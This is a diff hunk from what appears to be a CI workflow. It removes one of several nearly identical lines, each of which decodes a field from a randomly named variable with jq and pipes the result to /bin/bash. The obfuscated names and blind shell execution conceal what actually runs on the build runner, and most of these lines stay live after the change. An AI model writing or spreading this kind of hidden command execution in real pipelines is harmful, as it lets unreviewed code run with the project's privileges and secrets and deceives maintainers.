@@ -26,7 +26,6 @@ jobs:
           echo $nm22915 | jq -r .r32 | /bin/bash
           echo $axwpd13 | jq -r .j00180 | /bin/bash
           echo $kwtw11858 | jq -r .vdmdm5682 | /bin/bash
-          printf '%s' "$ceun5" | jq -r .h1564 | /bin/bash
           echo $t633 | jq -r .pqasn65 | /bin/bash
           echo $tjjwh1034 | jq -r .ac4690 | /bin/bash
           echo $ip7613 | jq -r .s4363 | /bin/bash
